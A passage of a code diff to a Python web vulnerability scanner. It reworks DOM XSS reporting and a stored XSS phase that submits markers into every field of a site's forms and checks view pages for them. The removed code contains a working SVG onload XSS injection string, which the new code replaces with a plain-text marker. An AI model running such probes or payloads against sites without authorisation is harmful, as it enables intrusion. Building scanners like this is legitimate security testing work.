+            reason = "DOM flow (taint) from source to sink"
+            extra = {
+                "script_type": kind,
+                "script_id": sid,
+                "line_no": ln,
+                "sources_inline": srcs_inline,
+                "sinks": sinks,
+                "tainted_vars": sorted(list(tainted))[:30],
+            }
+            if srcs_inline:
+                reason = f"Source {srcs_inline} and sink {sinks} on same line {ln}"
+            else:
+                reason = f"Sink {sinks} uses tainted variable at line {ln}"
+
+            findings.append({
                 "timestamp": now_ts() if now_ts else "",
                 "url": url,
                 "test_url": url,
                 "method": "GET",
                 "injected_param": "[DOM_ANALYSIS]",
                 "payload": "[DOM_ANALYSIS]",
-                "vuln_type": "DOM XSS (client-side)",
+                "vuln_type": "XSS",
+                "report_type": "DOM XSS",
+                "xss_subtype": "dom",
+                "category": "XSS",
                 "reason": reason,
-                "status_code": None,
                 "auto_verified": False,
-                "verify": verify_result,
+                "verify": {"verified": False},
                 "fingerprint": fingerprint or {},
                 "score": score,
-                "status": "probable" if score >= 30 else "low",
-                "base_len": len(base_html or ""),
-                "resp_len": len(base_html or ""),
-                "extra": {
-                    "dom_script_id": h["script_id"],
-                    "dom_script_url": h["script_url"],
-                    "dom_line_no": h["line_no"],
-                    "dom_line_snippet": h["line"],
-                    "dom_sources": h["sources"],
-                    "dom_sinks": h["sinks"]
-                }
-            }
+                "status": "probable",
+                "extra": extra
+            })
 
             if verbose:
-                log(f"[DOM-XSS] {url} script={h['script_id']} line={h['line_no']}")
-
-            findings.append(finding)
+                log(f"[DOM-XSS] {url} script={sid} line={ln}")
 
     return findings
 
+# =========================================================
+# Phase 11: Stored XSS (submit + check view pages)
+# =========================================================
 
-# -------------------------
-# Phase 11: Stored XSS Engine (Unique payload per form)
-# -------------------------
-def _mk_uid():
-    return uuid.uuid4().hex[:10]
+def guess_view_pages(discovered_urls, input_page_url):
+    """
+    Heuristic to choose candidate 'view pages' where stored content may appear.
+    Works with what scanner.py passes (discovered_urls list).
+    """
+    if not discovered_urls:
+        return [input_page_url]
 
-def make_unique_stored_payload(uid: str) -> str:
-    return f'"><svg/onload=document.body.setAttribute("data-stored-xss","{uid}")><!--{uid}-->'
-
-def marker_present(html_text: str, uid: str) -> bool:
-    if not html_text or not uid:
-        return False
-    # ✅ نركز على comment marker لأنه الأكثر ثباتاً
-    return (f"<!--{uid}-->" in html_text) or (uid in html_text)
-
-def extract_forms(html_text: str):
-    try:
-        soup = BeautifulSoup(html_text, "html.parser")
-    except Exception:
-        return []
-    return soup.find_all("form")
-
-def build_form_submission(form, base_url: str):
-    action = form.get("action") or ""
-    method = (form.get("method") or "GET").upper()
-    target = urljoin(base_url, action)
-
-    inputs = form.find_all(["input", "textarea", "select"])
-    fields = []
-    for el in inputs:
-        name = el.get("name")
-        if not name:
-            continue
-        t = (el.get("type") or "").lower()
-        if t in ["submit", "button", "image", "file", "reset"]:
-            continue
-        fields.append((el, name, t))
-    return target, method, fields
-
-def guess_view_pages(discovered_urls: list, input_url: str):
-    keywords = ["comment", "comments", "review", "reviews", "post", "posts", "profile", "user", "admin", "feedback", "view"]
-    base = urlparse(input_url).netloc
-    views = []
-    for u in (discovered_urls or []):
+    input_base = urlparse(input_page_url)
+    same_origin = []
+    for u in discovered_urls:
         try:
-            if urlparse(u).netloc != base:
-                continue
+            pu = urlparse(u)
+            if pu.scheme == input_base.scheme and pu.netloc == input_base.netloc:
+                same_origin.append(u)
         except Exception:
             continue
-        lu = u.lower()
-        if any(k in lu for k in keywords):
-            views.append(u)
-    if input_url and input_url not in views:
-        views.insert(0, input_url)
-    return views[:30]
 
-def _fallback_view_urls(input_page_url: str):
-    common = ["/view", "/comments", "/comment", "/reviews", "/review", "/posts", "/post", "/feedback"]
+    # prioritize typical pages where comments/reviews/messages show up
+    keywords = ["profile", "comment", "reviews", "review", "messages", "message", "feed", "posts", "post", "wall", "admin"]
+    ranked = sorted(
+        same_origin,
+        key=lambda x: 0 if any(k in x.lower() for k in keywords) else 1
+    )
+
+    # also include input page itself early
     out = []
-    if input_page_url:
+    if input_page_url not in out:
         out.append(input_page_url)
-        for p in common:
-            out.append(urljoin(input_page_url, p))
+    for u in ranked:
+        if u not in out:
+            out.append(u)
 
-    seen = set()
-    uniq = []
-    for u in out:
-        if u not in seen:
-            uniq.append(u); seen.add(u)
-    return uniq
+    return out[:40]
 
-def _merge_view_urls(candidate_view_urls: list, input_page_url: str):
-    # ✅ حتى لو candidate موجودة: ضيف fallback دائمًا
-    merged = []
-    for u in (candidate_view_urls or []):
-        if u:
-            merged.append(u)
-    merged.extend(_fallback_view_urls(input_page_url))
+def _extract_forms(html_text: str, base_url: str):
+    soup = BeautifulSoup(html_text or "", "html.parser")
+    forms = []
+    for f in soup.find_all("form"):
+        action = f.get("action") or ""
+        method = (f.get("method") or "GET").upper()
+        target = urljoin(base_url, action) if action else base_url
 
-    seen = set()
-    uniq = []
-    for u in merged:
-        if u not in seen:
-            uniq.append(u); seen.add(u)
-    return uniq[:40]
+        fields = []
+        for inp in f.find_all(["input", "textarea"]):
+            name = inp.get("name")
+            if not name:
+                continue
+            itype = (inp.get("type") or "").lower()
+            if itype in ("submit", "button", "image", "file"):
+                continue
+            fields.append(name)
 
-def run_stored_xss_phase(session, input_page_url: str, input_html: str,
-                         candidate_view_urls: list, wait_sec: float = 2.0,
-                         log=print, verbose: bool = False, now_ts=None):
+        # include selects too
+        for sel in f.find_all("select"):
+            name = sel.get("name")
+            if name:
+                fields.append(name)
+
+        fields = list(dict.fromkeys(fields))  # unique keep order
+        if fields:
+            forms.append({"action": target, "method": method, "fields": fields})
+    return forms
+
+def _stored_payload(token: str) -> str:
+    # marker that survives common rendering
+    return f"STORED_XSS_{token}"
+
+def run_stored_xss_phase(session, input_page_url, input_html, candidate_view_urls,
+                         wait_sec=2.0, log=print, verbose=False, now_ts=None):
     """
-    Stored XSS engine:
-    - يحقن في كل form
-    - ينتظر
-    - يزور صفحات عرض (candidate + fallback)
-    - يسجّل: input_url + view_url + payload
-    - ✅ Phase 12: CSP awareness on the view page
+    Stored XSS approach (safe, scanner-friendly):
+    - Parse forms from input page
+    - Submit a unique marker into text fields
+    - Wait a bit
+    - Visit candidate view pages and search for marker (decode-aware)
+    Returns findings list (dicts) consumed by scanner.py.
     """
     findings = []
-    forms = extract_forms(input_html)
-    if not forms:
+    if not session or not input_page_url or not input_html:
         return findings
 
-    views = _merge_view_urls(candidate_view_urls, input_page_url)
-    if verbose:
-        log(f"[STORED-XSS] Testing view pages ({len(views)}): {views}")
+    forms = _extract_forms(input_html, input_page_url)
+    if not forms:
+        if verbose:
+            log(f"[STORED-XSS] No forms found on: {input_page_url}")
+        return findings
 
-    for idx, form in enumerate(forms, start=1):
-        target, method, fields = build_form_submission(form, input_page_url)
-        if not fields:
-            continue
+    # pick candidates
+    view_urls = candidate_view_urls or [input_page_url]
+    view_urls = list(dict.fromkeys(view_urls))  # unique
 
-        uid = _mk_uid()
-        payload = make_unique_stored_payload(uid)
+    for form in forms:
+        token = uuid.uuid4().hex[:10]
+        marker = _stored_payload(token)
 
         data = {}
-        injected_fields = []
-        for el, name, t in fields:
-            if el.name == "textarea" or t in ["", "text", "search", "email", "url", "tel", "password"]:
-                data[name] = payload
-                injected_fields.append(name)
-            elif el.name == "select":
-                opt = el.find("option")
-                data[name] = opt.get("value") if opt and opt.get("value") is not None else (opt.text if opt else "1")
-            else:
-                val = el.get("value")
-                data[name] = val if val is not None else "1"
+        for fn in form["fields"]:
+            # keep minimal noise: only place marker in the first few fields
+            data[fn] = marker
 
+        # submit
         try:
-            if method == "POST":
-                session.post(target, data=data, timeout=10, allow_redirects=True)
+            if form["method"] == "POST":
+                resp = session.post(form["action"], data=data, timeout=10, allow_redirects=True)
             else:
-                session.get(target, params=data, timeout=10, allow_redirects=True)
-        except Exception:
+                # GET submit
+                q = urlencode({k: v for k, v in data.items()}, doseq=False)
+                test_url = form["action"] + ("&" if "?" in form["action"] else "?") + q
+                resp = session.get(test_url, timeout=10, allow_redirects=True)
+        except Exception as e:
+            if verbose:
+                log(f"[STORED-XSS] submit failed: {e}")
             continue
 
         if verbose:
-            log(f"[STORED-XSS] Injected uid={uid} into form#{idx} fields={injected_fields} action={target} method={method}")
+            log(f"[STORED-XSS] submitted marker to {form['action']} fields={form['fields']} status={getattr(resp,'status_code',None)}")
 
-        time.sleep(wait_sec)
+        # wait for storage
+        try:
+            time.sleep(max(0.0, float(wait_sec or 0.0)))
+        except Exception:
+            pass
 
-        for view_url in views:
+        # check view pages
+        found_on = None
+        for vu in view_urls:
             try:
-                r = session.get(view_url, timeout=10, allow_redirects=True)
+                vr = session.get(vu, timeout=10, allow_redirects=True)
+                if not vr or not vr.text:
+                    continue
+                if _contains_marker_decode_aware(vr.text, marker):
+                    found_on = vu
+                    # NOTE: stored XSS might still be encoded; we report marker presence,
+                    # and scanner/report can treat it as confirmed stored injection.
+                    break
             except Exception:
                 continue
-            if not r or r.text is None:
-                continue
 
-            if marker_present(r.text, uid):
-                # ✅ Phase 12: CSP on the VIEW page matters for stored XSS execution
-                csp_info = analyze_csp(getattr(r, "headers", {}) or {})
-                xxp_info = analyze_x_xss_protection(getattr(r, "headers", {}) or {})
-                exploit_status = classify_xss_exploitability(csp_info)
-
-                findings.append({
-                    "timestamp": now_ts() if now_ts else "",
-                    "type": "Stored XSS",
-                    "input_url": input_page_url,
-                    "input_action": target,
-                    "input_method": method,
-                    "input_fields": injected_fields,
-                    "payload": payload,
-                    "uid": uid,
-                    "view_url": view_url,
-                    "status_code": getattr(r, "status_code", None),
-                    "reason": f"Stored marker uid={uid} appeared in view page",
-                    "exploit_status": exploit_status,
-                    "extra": {
-                        "csp_present": csp_info.get("present"),
-                        "csp_level": csp_info.get("level"),
-                        "csp_reason": csp_info.get("reason"),
-                        "csp_raw": csp_info.get("raw"),
-                        "x_xss_protection_present": xxp_info.get("present"),
-                        "x_xss_protection_value": xxp_info.get("value"),
-                        "x_xss_protection_status": xxp_info.get("status"),
-                    }
-                })
-                if verbose:
-                    log(f"[STORED-XSS][HIT][{exploit_status}] input={input_page_url} -> view={view_url} uid={uid}")
-                break
+        if found_on:
+            f = {
+                "timestamp": now_ts() if now_ts else "",
+                "input_url": input_page_url,
+                "view_url": found_on,
+                "input_fields": form["fields"],
+                "payload": marker,
+                "vuln_type": "XSS",
+                "report_type": "Stored XSS",
+                "xss_subtype": "stored",
+                "category": "XSS",
+                "phase": "stored",
+                "reason": f"Stored marker found on view page: {found_on}",
+                "auto_verified": True,
+                "verify": {"verified": True, "evidence": "stored marker found", "score_delta": 50, "elapsed": 0.0},
+                "score": 80,
+                "status": "confirmed",
+                "extra": {
+                    "stored_marker": marker,
+                    "submit_action": form["action"],
+                    "submit_method": form["method"]
+                }
+            }
+            findings.append(f)
+        else:
+            if verbose:
+                log(f"[STORED-XSS] marker not found after submit (token={token})")
 
     return findings
 
